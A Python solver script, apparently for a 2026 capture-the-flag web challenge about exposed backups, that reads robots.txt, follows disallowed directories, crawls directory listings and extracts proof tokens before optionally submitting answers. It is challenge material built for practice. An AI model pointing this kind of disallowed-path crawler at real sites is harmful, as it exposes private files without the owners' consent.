#!/usr/bin/env python3
"""Huntress CTF 2026 - Web Exploitation Day 01 "Back Up a Minute" (backup exposure).
Dynamic solver: for each live target, read robots.txt -> follow Disallow dir ->
parse directory index -> fetch each listed file -> extract the proof_<hex> token.
Usage: web01_backup.py <challenge_id_with_optional_mode_suffix> [--submit]
"""
import sys, re, json, ssl, urllib.request
sys.path.insert(0, "~/ctf")
from gm import GM

CTX = ssl.create_default_context()
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")

def http_get(url, timeout=25):
    req = urllib.request.Request(url, headers={"User-Agent": "ctf-recon"})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, b""
    except Exception:
        return None, b""

def recover_proof(base):
    base = base.rstrip("/")
    # 1) robots.txt -> Disallow dirs
    dirs = []
    st, body = http_get(base + "/robots.txt")
    if body:
        for m in re.finditer(r"(?im)^\s*Disallow:\s*(\S+)", body.decode("utf-8", "replace")):
            dirs.append(m.group(1))
    dirs += ["/"]  # fall back to root
    seen = set()
    for d in dirs:
        if not d.startswith("/"):
            d = "/" + d
        st, body = http_get(base + d)
        if not body:
            continue
        html = body.decode("utf-8", "replace")
        # direct hit?
        m = PROOF_RE.search(html)
        if m:
            return m.group(0)
        # parse links in directory index, fetch each candidate file
        for href in re.findall(r'href="([^"]+)"', html):
            if href.startswith("http") or href.startswith("//"):
                continue
            if href in ("/", "#") or href.startswith("/assets/"):
                continue
            url = href if href.startswith("/") else d.rstrip("/") + "/" + href
            full = base + url
            if full in seen:
                continue
            seen.add(full)
            st2, b2 = http_get(full)
            if b2:
                m2 = PROOF_RE.search(b2.decode("utf-8", "replace"))
                if m2:
                    return m2.group(0)
    return None

def main():
    if len(sys.argv) < 2:
        print("usage: web01_backup.py <challenge> [--submit]"); return
    ch = sys.argv[1]
    do_submit = "--submit" in sys.argv[2:]
    g = GM()
    r = g.start(ch)
    mode = r.get("mode")
    targets = {t["id"]: t["url"] for t in r.get("targets", [])}
    questions = r.get("questions", [])
    deadline = r.get("deadline")
    print("mode=%s deadline=%s targets=%d questions=%d" % (mode, deadline, len(targets), len(questions)))
    answers = {}
    for q in questions:
        qid = q["id"]
        tgt = q.get("artifact")  # e.g. "Target 1"
        url = targets.get(tgt) or (list(targets.values())[0] if targets else None)
        if not url:
            print("  %s: NO TARGET" % qid); continue
        proof = recover_proof(url)
        print("  %s (%s) -> %s" % (qid, tgt, proof))
        if proof:
            answers[qid] = proof
    print("recovered %d/%d" % (len(answers), len(questions)))
    if do_submit and answers:
        res = g.submit(ch, answers)
        print("SUBMIT:", res.get("result"), "flag=" + str(res.get("flag")),
              "remaining=" + str(res.get("remaining")))
        print(json.dumps({k: res.get(k) for k in ("result", "flag", "remaining", "accepted_ids")}, indent=2))

if __name__ == "__main__":
    main()
